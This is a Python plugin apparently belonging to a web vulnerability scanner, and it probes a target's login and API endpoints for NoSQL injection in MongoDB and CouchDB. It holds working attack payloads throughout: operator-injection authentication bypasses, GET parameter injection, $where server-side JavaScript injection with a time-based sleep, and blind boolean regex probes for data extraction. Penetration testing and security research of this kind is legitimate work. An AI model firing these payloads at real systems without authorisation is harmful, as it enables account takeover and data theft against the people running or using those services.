# plugins/nosql_scanner.py
def run(target, ip, open_ports, banners):
    """
    Scanner NoSQL Injection (MongoDB/CouchDB).
    2026 Intel: PortSwigger operator injection, BrightSec SSJI,
    data extraction blind boolean, $where JS injection, $regex enum.
    """
    import requests
    import json

    endpoints = ["/api/login", "/login", "/api/auth", "/auth", "/api/users",
                 "/api/v1/login", "/api/v1/auth", "/api/search", "/api/v1/users",
                 "/api/v1/search", "/api/v1/products", "/api/account"]
    vulns = []

    for ep in endpoints:
        url = f"http://{target}{ep}"

        # T1: Operator injection ($ne, $gt — auth bypass)
        auth_payloads = [
            ({"username": {"$ne": ""}, "password": {"$ne": ""}}, "NE_BYPASS"),
            ({"username": {"$gt": ""}, "password": {"$gt": ""}}, "GT_BYPASS"),
            ({"username": {"$exists": True}, "password": {"$exists": True}}, "EXISTS_BYPASS"),
            ({"username": "admin", "password": {"$regex": ".*"}}, "REGEX_BYPASS"),
            ({"username": {"$in": ["admin", "administrator", "root"]}, "password": {"$ne": ""}}, "IN_BYPASS"),
        ]
        for payload, method in auth_payloads:
            try:
                resp = requests.post(url, json=payload, timeout=6,
                                     headers={"Content-Type": "application/json"})
                if resp.status_code == 200 and any(k in resp.text.lower() for k in
                    ["token", "session", "welcome", "dashboard", "success", "jwt", "logged"]):
                    vulns.append({
                        "tipo": "NOSQL_AUTH_BYPASS", "metodo": method,
                        "endpoint": ep, "severidade": "CRITICO",
                        "descricao": f"Auth bypass via {method}!",
                        "amostra": resp.text[:200],
                    })
                    break
            except Exception:
                continue

        # T2: GET parameter injection
        get_payloads = [
            ("[$ne]=1", "GET_NE"),
            ("[$gt]=", "GET_GT"),
            ("[$regex]=.*", "GET_REGEX"),
            ("[$exists]=true", "GET_EXISTS"),
        ]
        for suffix, method in get_payloads:
            try:
                resp = requests.get(f"{url}?username{suffix}&password{suffix}", timeout=5)
                if resp.status_code == 200 and len(resp.text) > 100:
                    vulns.append({
                        "tipo": "NOSQL_GET_INJECTION", "metodo": method,
                        "endpoint": ep, "severidade": "ALTO",
                    })
                    break
            except Exception:
                continue

        # T3: $where JavaScript injection (SSJI)
        where_payloads = [
            ({"$where": "function() { return true; }"}, "WHERE_TRUE"),
            ({"$where": "1==1"}, "WHERE_1EQ1"),
            ({"$where": "sleep(5000)"}, "WHERE_SLEEP"),
        ]
        for payload, method in where_payloads:
            try:
                resp = requests.post(url, json=payload, timeout=10,
                                     headers={"Content-Type": "application/json"})
                if "WHERE_SLEEP" in method and resp.elapsed.total_seconds() > 4:
                    vulns.append({
                        "tipo": "NOSQL_SSJI", "metodo": method,
                        "endpoint": ep, "severidade": "CRITICO",
                        "descricao": "Server-Side JavaScript Injection via $where (time-based)!",
                    })
                elif resp.status_code == 200 and method != "WHERE_SLEEP":
                    vulns.append({
                        "tipo": "NOSQL_WHERE_INJECTION", "metodo": method,
                        "endpoint": ep, "severidade": "ALTO",
                    })
            except Exception:
                continue

        # T4: Blind boolean extraction
        for char_test in ["a", "p", "1"]:
            try:
                true_payload = {"username": {"$regex": f"^{char_test}"}, "password": {"$ne": ""}}
                false_payload = {"username": {"$regex": "^ZZZZZZ"}, "password": {"$ne": ""}}
                r_true = requests.post(url, json=true_payload, timeout=5,
                                       headers={"Content-Type": "application/json"})
                r_false = requests.post(url, json=false_payload, timeout=5,
                                        headers={"Content-Type": "application/json"})
                if len(r_true.text) != len(r_false.text) or r_true.status_code != r_false.status_code:
                    vulns.append({
                        "tipo": "NOSQL_BLIND_BOOLEAN", "endpoint": ep,
                        "severidade": "ALTO",
                        "descricao": "Blind boolean NoSQL injection detectada!",
                    })
                    break
            except Exception:
                continue

    return {"plugin": "nosql_scanner", "resultados": vulns if vulns else "Nenhuma NoSQL injection detectada"}
